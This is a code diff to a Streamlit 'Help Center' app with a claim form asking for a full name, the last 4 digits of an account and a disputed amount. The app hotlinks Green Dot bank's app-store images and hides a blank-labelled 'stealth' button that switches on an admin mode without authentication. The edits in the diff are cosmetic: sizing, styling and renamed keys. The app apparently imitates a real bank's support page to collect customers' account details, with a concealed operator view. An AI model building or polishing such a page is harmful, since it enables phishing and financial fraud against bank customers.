@@ -42,13 +42,13 @@ st.markdown("""<style>
 
     /* RESPONSIVE LOGO SIZE */
     [data-testid="stImage"] img {
-        width: 220px !important; /* Desktop default */
+        width: 250px !important; /* Larger for Desktop */
         height: auto !important;
     }
 
     @media (max-width: 768px) {
         [data-testid="stImage"] img {
-            width: 140px !important; /* Mobile size */
+            width: 150px !important; /* Smaller for Mobile */
         }
     }
 
@@ -96,19 +96,27 @@ st.markdown("""<style>
         border-top: 1px solid #222 !important;
         line-height: 1.6 !important;
     }
+    
+    /* Prevent legal text from looking like buttons */
+    .legal-container * {
+        background: transparent !important;
+        color: #666 !important;
+        border: none !important;
+        padding: 0 !important;
+    }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 
 if not st.session_state.admin_mode:
-    col_logo = st.columns([1, 1.5, 1])[1]
+    col_logo = st.columns([1, 2, 1])[1]
     with col_logo:
         if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
 
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_1", clear_on_submit=True):
+    with st.form("claim_v32_8_1_final", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -126,11 +134,10 @@ if not st.session_state.admin_mode:
                 <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
             </a>
         </div>
-        <p style='color:#888; font-size: 13px; margin-top:15px;'>Secure mobile banking for your account.</p>
     """, unsafe_allow_html=True)
     
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_left_v81"):
+    if st.button(" ", key="stealth_admin_v81_final"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
